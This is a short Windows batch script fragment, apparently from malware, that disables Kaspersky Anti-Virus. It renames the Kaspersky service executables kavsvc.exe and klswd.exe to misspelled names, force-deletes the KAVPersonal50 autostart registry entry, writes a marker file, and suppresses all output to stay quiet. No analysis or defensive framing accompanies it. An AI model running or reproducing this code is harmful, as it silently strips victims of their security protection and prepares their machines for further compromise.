ren "%homedrive%\Program Files\Kaspersky Lab\kasper~1\kavsvc.exe" kavscv.exe > nul
ren "%homedrive%\Program Files\Kaspersky Lab\kasper~1\klswd.exe" kwlsd.exe > nul
reg delete HKEY_LOCAL_MACHINE\software\microsoft\windows\currentversion\run\ /v KAVPersonal50 /f > nul
echo KAV > %homedrive%/sys32144